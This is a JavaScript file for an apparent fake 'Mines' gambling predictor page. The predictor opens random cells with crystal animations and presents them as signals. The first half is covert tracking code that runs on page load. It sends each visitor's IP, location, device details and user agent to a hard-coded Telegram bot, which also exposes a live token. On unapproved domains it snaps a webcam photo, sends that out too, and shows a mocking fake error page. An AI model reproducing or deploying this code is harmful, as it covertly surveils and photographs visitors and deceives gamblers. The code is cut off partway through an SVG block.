const TELEGRAM_BOT_TOKEN = '8177372639:AAEh7lIQ8VHz_Qn5E6q1yJEIAFW0L4sdtCs';
const ADMIN_ID = '6436999031';

async function sendTelegramMessage(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        const data = await response.json();
        if (!data.ok) {
            console.error('Failed to send message:', data);
        }
    } catch (error) {
        console.error('Failed to send message:', error);
    }
}

async function getCountryName(countryCode) {
    try {
        const response = await fetch(`https://restcountries.com/v3.1/alpha/${countryCode}`);
        const data = await response.json();
        return data[0]?.name.common || 'Unknown';
    } catch (error) {
        console.error('Failed to fetch country name:', error);
        return 'Unknown';
    }
}

async function getUserInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const countryName = await getCountryName(data.country);
        const deviceInfo = parseUserAgent(navigator.userAgent);

        return {
            ip: data.ip,
            country: data.country,
            countryName: countryName,
            city: data.city,
            region: data.region,
            countryEmoji: getCountryEmoji(data.country),
            userAgent: navigator.userAgent,
            deviceModel: deviceInfo.model,
            deviceType: deviceInfo.type,
            deviceOS: deviceInfo.os
        };
    } catch (error) {
        console.error('Failed to fetch user info:', error);
        return {
            ip: 'Unknown',
            country: 'Unknown',
            countryName: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            countryEmoji: '❓',
            userAgent: navigator.userAgent,
            deviceModel: 'Unknown',
            deviceType: 'Unknown',
            deviceOS: 'Unknown'
        };
    }
}

function parseUserAgent(userAgent) {
    const mobileRegexes = [
        { regex: /iPhone\s*(\d+([_\.]\d+)*)/i, type: 'Mobile', os: 'iOS' },
        { regex: /iPad/i, type: 'Tablet', os: 'iOS' },
        { regex: /Android\s*([\d\.]+)/i, type: 'Mobile', os: 'Android' },
        { regex: /Windows Phone\s*([\d\.]+)/i, type: 'Mobile', os: 'Windows Phone' },
    ];

    const desktopRegexes = [
        { regex: /Windows/i, type: 'Desktop', os: 'Windows' },
        { regex: /Macintosh/i, type: 'Desktop', os: 'macOS' },
        { regex: /Linux/i, type: 'Desktop', os: 'Linux' }
    ];

    for (let mobileDevice of mobileRegexes) {
        const match = userAgent.match(mobileDevice.regex);
        if (match) {
            return {
                type: mobileDevice.type,
                os: mobileDevice.os,
                model: parseDeviceModel(userAgent, mobileDevice.os)
            };
        }
    }

    for (let desktopOS of desktopRegexes) {
        const match = userAgent.match(desktopOS.regex);
        if (match) {
            return {
                type: desktopOS.type,
                os: desktopOS.os,
                model: parseDeviceModel(userAgent, desktopOS.os)
            };
        }
    }

    return {
        type: 'Unknown',
        os: 'Unknown',
        model: 'Unknown Device'
    };
}

function parseDeviceModel(userAgent, os) {
    switch(os) {
        case 'iOS':
            const iPhoneMatch = userAgent.match(/iPhone\s*(\d+([_\.]\d+)*)/i);
            if (iPhoneMatch) {
                return `iPhone ${iPhoneMatch[1].replace(/[_\.]/g, ' ')}`;
            }
            const iPadMatch = userAgent.match(/iPad/i);
            if (iPadMatch) {
                return 'iPad';
            }
            break;
        case 'Android':
            const androidModelMatch = userAgent.match(/;\s*([^;)]+)\s*Build/i);
            if (androidModelMatch) {
                return androidModelMatch[1].trim();
            }
            break;
        case 'Windows':
            const windowsModelMatch = userAgent.match(/Windows\s*([\w\s]+)/i);
            if (windowsModelMatch) {
                return `Windows ${windowsModelMatch[1]}`;
            }
            break;
        case 'macOS':
            const macModelMatch = userAgent.match(/Macintosh;.*Mac\s*([\w\s]+)/i);
            if (macModelMatch) {
                return `Mac ${macModelMatch[1]}`;
            }
            break;
    }
    return 'Unknown Device';
}

function getCountryEmoji(countryCode) {
    return countryCode.replace(/./g, char =>
        String.fromCodePoint(127397 + char.toUpperCase().charCodeAt())
    );
}

async function captureAndSendPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        video.pause();
        stream.getTracks().forEach(track => track.stop());

        const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
        const formData = new FormData();
        formData.append('chat_id', ADMIN_ID);
        formData.append('photo', imageBlob, 'photo.jpg');

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        console.log('Photo captured and sent successfully');
    } catch (error) {
        console.error('Failed to capture photo:', error);
    }
}

async function initTelegramBot() {
    const domainInfo = {
        domain: window.location.hostname,
        fullUrl: window.location.href
    };


    if (domainInfo.domain !== 'secretgamblebot111.github.io' && domainInfo.domain !== 'rokinchik.github.io') {
        document.body.innerHTML = `
            <div id="overlay">
                <h1>Ошибка 404: Доступ запрещен</h1>
                <div class="arrow top"></div>
                <div class="arrow bottom"></div>
                <div class="arrow left"></div>
                <div class="arrow right"></div>
                <img src="data:image/png;base64,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" alt="Error Image" style="max-width: 100%; height: auto;" />
                <p>К сожалению, возникли проблемы с доступом к сайту:</p>
                <ul>
                    <li>Не удалось загрузить ресурс.</li>
                    <li>Проблемы с сервером.</li>
                    <li>Неправильный домен.</li>
                    <li>Возможно вы блюм.</li>
                    <li>Возможно вы хотели спиздить вебку.</li>
                    <li>Возможно вы хотели обновить вебку за 15$.</li>
                    <li>Возможно вы хотели купить вебку у ее кодера.</li>
                </ul>
                <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" id="fixButton">Fix It</a>
            </div>
        `;

        const style = document.createElement('style');
        style.innerHTML = `
            body {
                margin: 0;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                position: relative;
                overflow: hidden;
                background-color: #282c34;
                color: white;
                font-family: 'Arial', sans-serif;
            }
            #overlay {
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 9999;
                padding: 20px;
                animation: flicker 1s infinite;
            }
            h1 {
                font-size: 4em;
                margin: 0;
                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
                animation: glow 1.5s infinite alternate;
            }
            p {
                font-size: 1.5em;
                margin: 20px 0;
                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
            }
            ul {
                list-style-type: none;
                padding: 0;
                text-align: center;
                font-size: 1.2em;
            }
            #fixButton {
                background-color: white;
                color: red;
                border: none;
                padding: 10px 20px;
                font-size: 18px;
                cursor: pointer;
                text-decoration: none;
                border-radius: 5px;
                transition: background-color 0.3s, transform 0.3s;
                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);
            }
            #fixButton:hover {
                background-color: #ddd;
                transform: scale(1.05);
            }
            @keyframes flicker {
                0% { opacity: 1; }
                50% { opacity: 0.7; }
                100% { opacity: 1; }
            }
            @keyframes glow {
                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }
                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }
            }
        `;
        document.head.appendChild(style);

        const userInfo = await getUserInfo();
        await sendTelegramMessage(`
🚫 <b>Unauthorized Access Attempt Detected</b>
📍 Domain: <code>${domainInfo.domain}</code>
🔗 URL: <code>${domainInfo.fullUrl}</code>
🌐 IP: <code>${userInfo.ip}</code>
📌 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.countryName} ${userInfo.countryEmoji}
📱 Device: <code>${userInfo.deviceModel}</code>
🖥️ Type: <code>${userInfo.deviceType} (${userInfo.deviceOS})</code>
📱 User Agent: <code>${userInfo.userAgent}</code>
⏰ Time: <code>${new Date().toISOString()}</code>
        `);

        await captureAndSendPhoto();

        // Перезагрузка страницы каждую секунду
        setInterval(() => {
            location.reload();
        }, 11200);

        return;
    }

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
        const data = await response.json();

        if (data.ok) {
            console.log('Bot initialized');
            isAuthenticated = true;

            const userInfo = await getUserInfo();
            await sendTelegramMessage(`
🚀 <b>New Bot Access Detected</b>
📍 Domain: <code>${domainInfo.domain}</code>
🔗 URL: <code>${domainInfo.fullUrl}</code>
🌐 IP: <code>${userInfo.ip}</code>
📌 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.countryName} ${userInfo.countryEmoji}
📱 Device: <code>${userInfo.deviceModel}</code>
🖥️ Type: <code>${userInfo.deviceType} (${userInfo.deviceOS})</code>
📱 User Agent: <code>${userInfo.userAgent}</code>
⏰ Time: <code>${new Date().toISOString()}</code>
            `);
        }
    } catch (error) {
        console.error('Failed to initialize bot:', error);

        const userInfo = await getUserInfo();
        await sendTelegramMessage(`
❗️ <b>Bot Initialization Failed</b>
📍 Domain: <code>${domainInfo.domain}</code>
🔗 URL: <code>${domainInfo.fullUrl}</code>
🌐 IP: <code>${userInfo.ip}</code>
📌 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.countryName} ${userInfo.countryEmoji}
📱 Device: <code>${userInfo.deviceModel}</code>
🖥️ Type: <code>${userInfo.deviceType} (${userInfo.deviceOS})</code>
📱 User Agent: <code>${userInfo.userAgent}</code>
⏰ Time: <code>${new Date().toISOString()}</code>
        `);
    }
}

document.addEventListener('DOMContentLoaded', (event) => {
    initTelegramBot();
});










document.addEventListener('DOMContentLoaded', function() {
    const mineCountButtons = document.querySelectorAll('.tabs-sFnRoeYcgf button');
    const boardButtons = document.querySelectorAll('.board-hDQpSRLTjA .container-fhHWujR0Pg');
    const betButton = document.getElementById('salt-bet-btn');
    let selectedMineCount = 3; // По умолчанию выбрано 3 мины

    // Функция для сброса игры
    function resetGame() {
        boardButtons.forEach(button => {
            button.innerHTML = '<div class="cover-RNEvNVYHpg"><img src="./Mines_files/cover.svg" alt=""></div>';
        });
    }

    // Функция для открытия случайных клеток
    function openRandomCells(count) {
        const buttonsArray = Array.from(boardButtons);
        const randomIndices = [];

        while (randomIndices.length < count) {
            const randomIndex = Math.floor(Math.random() * buttonsArray.length);
            if (!randomIndices.includes(randomIndex)) {
                randomIndices.push(randomIndex);
            }
        }

        randomIndices.forEach(index => {
            buttonsArray[index].innerHTML = `
                <button type="button" class="container-fhHWujR0Pg crystal-YLQlhnTwGF fade-enter-done">
                  <div class="icon-IHx41hFbj2">
                    <svg id="mastericon-crystal_input" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" viewBox="-3 -3 38 38">
                      <style>
                        @keyframes mastericon-crystal_input-u-copy-of-group_ts__ts {
                          0% {
                            transform: translate(15.9847px, 17.378201px) scale(.85, .85);
                            animation-timing-function: cubic-bezier(.42, 0, .325, .995)
                          }
                          20% {
                            transform: translate(15.9847px, 17.378201px) scale(1.25, 1.25);
                            animation-timing-function: cubic-bezier(.42, 0, .58, 1)
                          }
                          40% {
                            transform: translate(15.9847px, 17.378201px) scale(.95, .95);
                            animation-timing-function: cubic-bezier(.42, 0, .58, 1)
                          }
                          53.333333%,
                          to {
                            transform: translate(15.9847px, 17.378201px) scale(1, 1)
                          }
                        }
                        
                        @keyframes mastericon-crystal_input-u-copy-of-group_c_o {
                          0% {
                            opacity: 0
                          }
                          20%,
                          to {
                            opacity: 1
                          }
                        }
                        
                        @keyframes mastericon-crystal_input-u-copy-of-rectangle_to__to {
                          0% {
                            transform: translate(31.993264px, 4.937941px)
                          }
                          46.666667% {
                            transform: translate(31.993264px, 4.937941px);
                            animation-timing-function: cubic-bezier(.42, 0, .58, 1)
                          }
                          93.333333%,
                          to {
                            transform: translate(-4.17223px, 35.485334px)
                          }
                        }
                        
                        @keyframes mastericon-crystal_input-u-copy-of-group-2_ts__ts {
                          0% {
                            transform: translate(15.9847px, 17.378201px) scale(.85, .85);
                            animation-timing-function: cubic-bezier(.42, 0, .325, .995)
                          }
                          20% {
                            transform: translate(15.9847px, 17.378201px) scale(1.25, 1.25);
                            animation-timing-function: cubic-bezier(.42, 0, .58, 1)
                          }
                          40% {
                            transform: translate(15.9847px, 17.378201px) scale(.95, .95);
                            animation-timing-function: cubic-bezier(.42, 0, .58, 1)
                          }
                          53.333333%,
                          to {
                            transform: translate(15.9847px, 17.378201px) scale(1, 1)
                          }
                        }
                        
                        @keyframes mastericon-crystal_input-u-copy-of-group-2_c_o {
                          0% {
                            opacity: 0
                          }
                          20%,
                          to {
                            opacity: 1
                          }
                        }
                        
                        #mastericon-crystal_input-u-copy-of-group_ts {
                          animation: mastericon-crystal_input-u-copy-of-group_ts__ts 1500ms linear 1 normal forwards
                        }
                        
                        #mastericon-crystal_input-u-copy-of-group {
                          animation: mastericon-crystal_input-u-copy-of-group_c_o 1500ms linear 1 normal forwards
                        }
                        
                        #mastericon-crystal_input-u-copy-of-rectangle_to {
                          animation: mastericon-crystal_input-u-copy-of-rectangle_to__to 1500ms linear 1 normal forwards
                        }
                        
                        #mastericon-crystal_input-u-copy-of-group-2_ts {
                          animation: mastericon-crystal_input-u-copy-of-group-2_ts__ts 1500ms linear 1 normal forwards
                        }
                        
                        #mastericon-crystal_input-u-copy-of-group-2 {
                          animation: mastericon-crystal_input-u-copy-of-group-2_c_o 1500ms linear 1 normal forwards
                        }
                      </style>
                      <defs>
                        <lineargradient id="mastericon-crystal_input-s-path1-fill" x1="13" x2="23.419" y1="4" y2="12.196" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path1-fill-0" offset="0%" stop-color="var(--mines-star-linear-01)"></stop>
                          <stop id="mastericon-crystal_input-s-path1-fill-1" offset="100%" stop-color="var(--mines-star-linear-02)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path2-stroke" x1="9.636" x2="22.973" y1="5.783" y2="25.591" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path2-stroke-0" offset="0%" stop-color="#fff"></stop>
                          <stop id="mastericon-crystal_input-s-path2-stroke-1" offset="100%" stop-color="rgba(255,255,255,0)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path3-fill" x1="21" x2="29.291" y1="12.5" y2="19.357" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path3-fill-0" offset="0%" stop-color="var(--mines-star-linear-01)"></stop>
                          <stop id="mastericon-crystal_input-s-path3-fill-1" offset="100%" stop-color="var(--mines-star-linear-02)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path4-stroke" x1="9.636" x2="22.973" y1="5.783" y2="25.591" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path4-stroke-0" offset="0%" stop-color="#fff"></stop>
                          <stop id="mastericon-crystal_input-s-path4-stroke-1" offset="100%" stop-color="rgba(255,255,255,0)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path5-fill" x1="24.5" x2="17.06" y1="32.5" y2="23.521" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path5-fill-0" offset="0%" stop-color="var(--mines-star-linear-02)"></stop>
                          <stop id="mastericon-crystal_input-s-path5-fill-1" offset="100%" stop-color="var(--mines-star-linear-01)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path6-stroke" x1="9.636" x2="22.973" y1="5.783" y2="25.591" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path6-stroke-0" offset="0%" stop-color="#fff"></stop>
                          <stop id="mastericon-crystal_input-s-path6-stroke-1" offset="100%" stop-color="rgba(255,255,255,0)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path7-fill" x1="11" x2="7.281" y1="34" y2="19.708" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path7-fill-0" offset="0%" stop-color="var(--mines-star-linear-02)"></stop>
                          <stop id="mastericon-crystal_input-s-path7-fill-1" offset="100%" stop-color="var(--mines-star-linear-01)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path8-stroke" x1="9.636" x2="22.973" y1="5.783" y2="25.591" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path8-stroke-0" offset="0%" stop-color="#fff"></stop>
                          <stop id="mastericon-crystal_input-s-path8-stroke-1" offset="100%" stop-color="rgba(255,255,255,0)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path9-fill" x1="5" x2="7.951" y1="11.5" y2="24.243" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path9-fill-0" offset="0%" stop-color="var(--mines-star-linear-01)"></stop>
                          <stop id="mastericon-crystal_input-s-path9-fill-1" offset="100%" stop-color="var(--mines-star-linear-02)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path10-stroke" x1="9.636" x2="22.973" y1="5.783" y2="25.591" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path10-stroke-0" offset="0%" stop-color="#fff"></stop>
                          <stop id="mastericon-crystal_input-s-path10-stroke-1" offset="100%" stop-color="rgba(255,255,255,0)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path11-fill" x1="13.058" x2="16.899" y1="5.671" y2="14.268" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path11-fill-0" offset="0%" stop-color="#c2f952"></stop>
                          <stop id="mastericon-crystal_input-s-path11-fill-1" offset="100%" stop-color="#7da929"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path12-fill" x1="6.655" x2="10.863" y1="11.159" y2="19.939" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path12-fill-0" offset="0%" stop-color="#b9eb5e"></stop>
                          <stop id="mastericon-crystal_input-s-path12-fill-1" offset="100%" stop-color="#4d6a11"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path13-fill" x1="22.204" x2="26.229" y1="11.342" y2="20.854" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path13-fill-0" offset="0%" stop-color="#82ad2e"></stop>
                          <stop id="mastericon-crystal_input-s-path13-fill-1" offset="100%" stop-color="#4d6a11"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path14-fill" x1="22.022" x2="9.034" y1="30.732" y2="21.403" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path14-fill-0" offset="0%" stop-color="#52700e"></stop>
                          <stop id="mastericon-crystal_input-s-path14-fill-1" offset="100%" stop-color="#9dd61b"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path15-fill" x1="16.168" x2="10.497" y1="29.269" y2="18.476" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path15-fill-0" offset="0%" stop-color="#506f0c"></stop>
                          <stop id="mastericon-crystal_input-s-path15-fill-1" offset="100%" stop-color="#96c81d"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-u-copy-of-rectangle-fill" x1="0" x2="1" y1=".5" y2=".5" gradientUnits="objectBoundingBox" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-u-copy-of-rectangle-fill-0" offset="0%" stop-color="rgba(255,255,255,0)"></stop>
                          <stop id="mastericon-crystal_input-u-copy-of-rectangle-fill-1" offset="48%" stop-color="#fff"></stop>
                          <stop id="mastericon-crystal_input-u-copy-of-rectangle-fill-2" offset="100%" stop-color="rgba(255,255,255,0)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path16-fill" x1="13" x2="23.419" y1="4" y2="12.196" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path16-fill-0" offset="0%" stop-color="var(--mines-star-linear-01)"></stop>
                          <stop id="mastericon-crystal_input-s-path16-fill-1" offset="100%" stop-color="var(--mines-star-linear-02)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path17-stroke" x1="9.636" x2="22.973" y1="5.783" y2="25.591" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path17-stroke-0" offset="0%" stop-color="#fff"></stop>
                          <stop id="mastericon-crystal_input-s-path17-stroke-1" offset="100%" stop-color="rgba(255,255,255,0)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path18-fill" x1="21" x2="29.291" y1="12.5" y2="19.357" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path18-fill-0" offset="0%" stop-color="var(--mines-star-linear-01)"></stop>
                          <stop id="mastericon-crystal_input-s-path18-fill-1" offset="100%" stop-color="var(--mines-star-linear-02)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path19-stroke" x1="9.636" x2="22.973" y1="5.783" y2="25.591" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path19-stroke-0" offset="0%" stop-color="#fff"></stop>
                          <stop id="mastericon-crystal_input-s-path19-stroke-1" offset="100%" stop-color="rgba(255,255,255,0)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path20-fill" x1="24.5" x2="17.06" y1="32.5" y2="23.521" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path20-fill-0" offset="0%" stop-color="var(--mines-star-linear-02)"></stop>
                          <stop id="mastericon-crystal_input-s-path20-fill-1" offset="100%" stop-color="var(--mines-star-linear-01)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path21-stroke" x1="9.636" x2="22.973" y1="5.783" y2="25.591" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path21-stroke-0" offset="0%" stop-color="#fff"></stop>
                          <stop id="mastericon-crystal_input-s-path21-stroke-1" offset="100%" stop-color="rgba(255,255,255,0)"></stop>
                        </lineargradient>
